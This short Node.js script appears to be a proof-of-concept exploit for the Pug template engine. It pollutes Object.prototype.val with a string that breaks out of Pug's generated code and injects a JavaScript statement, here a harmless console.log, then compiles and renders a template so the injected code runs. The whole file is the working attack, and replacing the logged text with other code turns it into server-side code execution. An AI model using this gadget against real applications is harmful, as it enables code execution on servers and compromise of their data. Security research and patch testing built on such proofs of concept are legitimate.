pug = require("pug")

Object.prototype.val = '"somevalue", false)); console.log("GG!");//'

const path = require('path');
const templatePath = path.join(__dirname+"/views/", 'attrs.pug');
const template = pug.compileFile(templatePath);

template({});